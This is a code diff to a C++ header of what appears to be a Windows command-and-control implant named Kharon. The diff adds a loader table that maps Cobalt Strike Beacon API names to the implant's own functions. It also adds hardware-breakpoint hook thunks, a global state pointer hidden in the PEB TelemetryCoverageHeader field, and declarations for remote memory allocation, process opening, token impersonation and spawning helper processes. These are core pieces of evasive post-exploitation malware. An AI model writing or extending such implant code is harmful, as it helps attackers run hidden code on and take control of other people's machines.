@@ -5,6 +5,7 @@
 #include <ntstatus.h>
 #include <guiddef.h>
 #include <winsock.h>
+#include <stdio.h>
 
 namespace mscorlib {
     #include <Mscoree.h>
@@ -143,6 +144,8 @@ class Socket;
 #define x64_OPCODE_MOV			0xB8
 #define	x64_SYSCALL_STUB_SIZE   0x20
 
+#define G_KHARON Root::Kharon* Self = (Root::Kharon*)NtCurrentPeb()->TelemetryCoverageHeader;
+
 typedef struct {
 
 } BEACON_INFO, *PBEACON_INFO;
@@ -190,6 +193,14 @@ namespace Root {
         Parser*    Psr;
         Package*   Pkg;
     
+        struct {
+            UPTR Handle;
+
+            DECLAPI( vprintf );
+        } Msvcrt = {
+            RSL_TYPE( vprintf )
+        };
+
         struct {
             PCHAR CompName;
             PCHAR UserName;
@@ -660,7 +671,7 @@ namespace Root {
         ) -> VOID;
 
         VOID InitCoff( Coff* CoffRf ) { Cf = CoffRf; }
-        VOID InitCoff( Beacon* BeaconRf ) { Bc = BeaconRf; }
+        VOID InitHwbp( HwbpEng* HwbpRf ) { Hw = HwbpRf; }
         VOID InitSpoof( Spoof* SpoofRf ) { Spf = SpoofRf; }
         VOID InitSyscall( Syscall* SyscallRf ) { Sys = SyscallRf; }
         VOID InitSocket( Socket* SocketRf ) { Sckt = SocketRf; }
@@ -711,30 +722,36 @@ public:
     struct {
         UPTR  SymHash;
         PVOID SymPtr;
-    } ApiTable[30] = {};
+    } ApiTable[30] = {        
+        ApiTable[0]  = { Hsh::Str("BeaconDataParse"),        reinterpret_cast<PVOID>(&Coff::DataParse) },
+        ApiTable[1]  = { Hsh::Str("BeaconDataInt"),          reinterpret_cast<PVOID>(&Coff::DataInt) },
+        ApiTable[2]  = { Hsh::Str("BeaconDataExtract"),      reinterpret_cast<PVOID>(&Coff::DataExtract) },
+        ApiTable[3]  = { Hsh::Str("BeaconDataShort"),        reinterpret_cast<PVOID>(&Coff::DataShort) },
+        ApiTable[4]  = { Hsh::Str("BeaconDataLength"),       reinterpret_cast<PVOID>(&Coff::DataLength) },
+        ApiTable[5]  = { Hsh::Str("BeaconOutput"),           reinterpret_cast<PVOID>(&Coff::Output) },
+        ApiTable[6]  = { Hsh::Str("BeaconPrintf"),           reinterpret_cast<PVOID>(&Coff::Printf) },
+        // ApiTable[7]  = { Hsh::Str("BeaconInformation"),      reinterpret_cast<PVOID>(&Coff::Information) },
+        // ApiTable[8]  = { Hsh::Str("BeaconAddValue"),         reinterpret_cast<PVOID>(&Coff::AddValue) },
+        // ApiTable[9]  = { Hsh::Str("BeaconGetValue"),         reinterpret_cast<PVOID>(&Coff::GetValue) },
+        // ApiTable[10] = { Hsh::Str("BeaconRemoveValue"),      reinterpret_cast<PVOID>(&Coff::RmValue) },
+        ApiTable[11] = { Hsh::Str("BeaconVirtualAlloc"),     reinterpret_cast<PVOID>(&Coff::VirtualAlloc) },
+        ApiTable[12] = { Hsh::Str("BeaconVirtualProtect"),   reinterpret_cast<PVOID>(&Coff::VirtualProtect) },
+        ApiTable[13] = { Hsh::Str("BeaconVirtualAllocEx"),   reinterpret_cast<PVOID>(&Coff::VirtualAllocEx) },
+        ApiTable[14] = { Hsh::Str("BeaconVirtualProtectEx"), reinterpret_cast<PVOID>(&Coff::VirtualProtectEx) },
+        // ApiTable[15] = { Hsh::Str("BeaconIsAdmin"),          reinterpret_cast<PVOID>(&Coff::IsAdmin) },
+        // ApiTable[16] = { Hsh::Str("BeaconRevertToken"),      reinterpret_cast<PVOID>(&Coff::RevertToken) },
+        ApiTable[17] = { Hsh::Str("BeaconOpenProcess"),      reinterpret_cast<PVOID>(&Coff::OpenProcess) },
+        ApiTable[18] = { Hsh::Str("BeaconOpenThread"),       reinterpret_cast<PVOID>(&Coff::OpenThread) },
+        // ApiTable[19] = { Hsh::Str("BeaconGetSpawnTo"),       reinterpret_cast<PVOID>(&Coff::GetSpawn) },
+    };
+    
+    Coff( Root::Kharon* KharonRf ) : Self( KharonRf ) {}
 
-    Coff( Root::Kharon* KharonRf ) : Self( KharonRf ) {
-        ApiTable[0]  = { Hsh::Str("BeaconDataParse"),        (PVOID)&Coff::DataParse };
-        ApiTable[1]  = { Hsh::Str("BeaconDataInt"),          (PVOID)&Coff::DataInt };
-        ApiTable[2]  = { Hsh::Str("BeaconDataExtract"),      (PVOID)&Coff::DataExtract };
-        ApiTable[3]  = { Hsh::Str("BeaconDataShort"),        (PVOID)&Coff::DataShort };
-        ApiTable[4]  = { Hsh::Str("BeaconDataLength"),       (PVOID)&Coff::DataLength };
-        ApiTable[5]  = { Hsh::Str("BeaconOutput"),           (PVOID)&Coff::Output };
-        ApiTable[6]  = { Hsh::Str("BeaconPrintf"),           (PVOID)&Coff::Printf };
-        ApiTable[7]  = { Hsh::Str("BeaconInformation"),      (PVOID)&Coff::Information };
-        ApiTable[8]  = { Hsh::Str("BeaconAddValue"),         (PVOID)&Coff::AddValue };
-        ApiTable[9]  = { Hsh::Str("BeaconGetValue"),         (PVOID)&Coff::GetValue };
-        ApiTable[10] = { Hsh::Str("BeaconRemoveValue"),      (PVOID)&Coff::RmValue };
-        ApiTable[11] = { Hsh::Str("BeaconVirtualAlloc"),     (PVOID)&Coff::VirtualAlloc };
-        ApiTable[12] = { Hsh::Str("BeaconVirtualProtect"),   (PVOID)&Coff::VirtualProtect };
-        ApiTable[13] = { Hsh::Str("BeaconVirtualAllocEx"),   (PVOID)&Coff::VirtualAllocEx };
-        ApiTable[14] = { Hsh::Str("BeaconVirtualProtectEx"), (PVOID)&Coff::UseToken };
-        ApiTable[15] = { Hsh::Str("BeaconIsAdmin"),          (PVOID)&Coff::IsAdmin };
-        ApiTable[16] = { Hsh::Str("BeaconRevertToken"),      (PVOID)&Coff::RevertToken };
-        ApiTable[17] = { Hsh::Str("BeaconOpenProcess"),      (PVOID)&Coff::OpenProcess };
-        ApiTable[18] = { Hsh::Str("BeaconOpenThread"),       (PVOID)&Coff::OpenThread };
-        ApiTable[19] = { Hsh::Str("BeaconGetSpawnTo"),       (PVOID)&Coff::GetSpawn };
-    }
+    inline auto RslRel(
+        _In_ PVOID  Base,
+        _In_ PVOID  Rel,
+        _In_ UINT16 Type
+    ) -> VOID;
 
     auto RslApi(
         _In_ PCHAR SymName
@@ -742,148 +759,150 @@ public:
 
     auto Loader(
         _In_ PBYTE Buffer,
-        _In_ ULONG Size
+        _In_ ULONG Size,
+        _In_ PBYTE Args,
+        _In_ ULONG Argc
     ) -> BOOL;
 
-    auto DataExtract(
+    static auto DataExtract(
         PDATAP parser,
         PINT   size
     ) -> PCHAR;
 
-    auto DataInt(
+    static auto DataInt(
         PDATAP parser
     ) -> INT;
 
-    auto DataLength(
+    static auto DataLength(
         PDATAP parser
     ) -> INT;
 
-    auto DataShort(
+    static auto DataShort(
         PDATAP parser
     ) -> SHORT;
 
-    auto DataParse(
+    static auto DataParse(
         PDATAP parser,
         PCHAR  buffer,
         INT    size
     ) -> VOID;
 
-    auto DataPtr(
+    static auto DataPtr(
         PDATAP parser, 
         INT    size
     ) -> VOID;
 
-    auto FmtAlloc(
+    static auto FmtAlloc(
         PFMTP fmt,
         INT   maxsz
     ) -> VOID;
 
-    auto FmtAppend(
+    static auto FmtAppend(
         PFMTP fmt
     ) -> VOID;
 
-    auto FmtFree(
+    static auto FmtFree(
         PFMTP fmt
     ) -> VOID;
 
-    auto FmtInt(
+    static auto FmtInt(
         PFMTP fmt,
         INT   val
     ) -> VOID;
 
-    auto FmtPrintf(
+    static auto FmtPrintf(
         PFMTP fmt,
         PCCH  text,
         INT   len
     ) -> VOID;
 
-    auto FmtReset(
+    static auto FmtReset(
         PFMTP fmt
     ) -> VOID;
 
-    auto FmtToString(
+    static auto FmtToString(
         PFMTP fmt,
         PINT  size
     ) -> PCHAR;
 
-    auto IsAdmin(
+    static auto IsAdmin(
         VOID
     ) -> BOOL;
 
-    auto UseToken(
+    static auto UseToken(
         HANDLE token
     ) -> BOOL;
 
-    auto RevertToken(
+    static auto RevertToken(
         VOID
     ) -> VOID;
 
-    auto GetSpawn(
+    static auto GetSpawn(
         BOOL  x86, 
         PCHAR buffer,
         INT   length
     ) -> VOID;
 
-    auto SpawnTmpProcess(
+    static auto SpawnTmpProcess(
         BOOL x86, 
         BOOL ignoreToken, 
         STARTUPINFO si, 
         PPROCESS_INFORMATION pInfo
     ) -> BOOL;
 
-    auto CleanupProcess(
+    static auto CleanupProcess(
         PPROCESS_INFORMATION pinfo
     ) -> VOID;
 
-    auto DataStoreGetItem(
+    static auto DataStoreGetItem(
 
     );
 
-    auto DataStoreProtectItem(
+    static auto DataStoreProtectItem(
 
     );
 
-    auto DataStoreUnprotectItem(
+    static auto DataStoreUnprotectItem(
 
     );
 
-    auto Information(
+    static auto Information(
         PBEACON_INFO Info
-    );
+    ) -> VOID;
 
-    auto AddValue(
+    static auto AddValue(
         PCCH  key, 
         PVOID ptr
     ) -> BOOL;
 
-    auto GetValue(
+    static auto GetValue(
         PCCH key
     ) -> PVOID;
 
-    auto RmValue(
+    static auto RmValue(
         PCCH key
     ) -> BOOL;
 
-    auto Printf(
+    static auto Printf(
         INT  type,
         PCCH Fmt,
         ...
     ) -> VOID;
 
-    auto Output(
+    static auto Output(
         INT  type,
         PCCH data,
         INT  len
     ) -> VOID;
 
-    auto VirtualAlloc(
+    static auto VirtualAlloc(
         LPVOID Address, 
         SIZE_T Size, 
         DWORD  AllocType, 
         DWORD  Protect
     ) -> PVOID; 
 
-    auto VirtualAllocEx(
+    static auto VirtualAllocEx(
         HANDLE Handle,
         LPVOID Address, 
         SIZE_T Size, 
@@ -891,14 +910,14 @@ public:
         DWORD  Protect
     ) -> PVOID; 
 
-    auto VirtualProtect(
+    static auto VirtualProtect(
         LPVOID Address, 
         SIZE_T Size, 
         DWORD  NewProtect, 
         PDWORD OldProtect
     ) -> BOOL;
 
-    auto VirtualProtectEx(
+    static auto VirtualProtectEx(
         HANDLE Handle,
         LPVOID Address, 
         SIZE_T Size, 
@@ -906,19 +925,19 @@ public:
         PDWORD OldProtect
     ) -> BOOL;
     
-    auto OpenProcess(
+    static auto OpenProcess(
         DWORD desiredAccess, 
         BOOL  inheritHandle, 
         DWORD processId
     ) -> HANDLE;
 
-    auto OpenThread(
+    static auto OpenThread(
         DWORD desiredAccess, 
         BOOL  inheritHandle, 
         DWORD threadId
     ) -> HANDLE;
 
-    auto LoadLibraryA(
+    static auto LoadLibraryA(
         _In_ PCHAR LibraryName
     ) -> HMODULE;
 };
@@ -1036,7 +1055,8 @@ public:
     __forceinline auto static DECLFN HookCallbackThunk(
         _In_ PVOID This
     ) -> VOID {
-        return static_cast<HwbpEng*>( This )->HookCallback( static_cast<HwbpEng*>( This )->HookCallbackArg.Parameter, static_cast<HwbpEng*>( This )->HookCallbackArg.TimerWait );
+        This = NtCurrentPeb()->TelemetryCoverageHeader;
+        return static_cast<Root::Kharon*>( This )->Hw->HookCallback( static_cast<Root::Kharon*>( This )->Hw->HookCallbackArg.Parameter, static_cast<Root::Kharon*>( This )->Hw->HookCallbackArg.TimerWait );
     }
 
     auto MainHandler( 
@@ -1048,7 +1068,7 @@ public:
         _In_ PVOID               This
     ) -> LONG {
         This = NtCurrentPeb()->TelemetryCoverageHeader;
-        return static_cast<HwbpEng*>( This )->MainHandler( e );
+        return static_cast<Root::Kharon*>( This )->Hw->MainHandler( e );
     }
 
     auto AddNewThreads(
@@ -1328,6 +1348,7 @@ private:
 public:
     Parser( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
+    BOOL    Endian;
     PPARSER Shared;
 
     auto NewTask( 
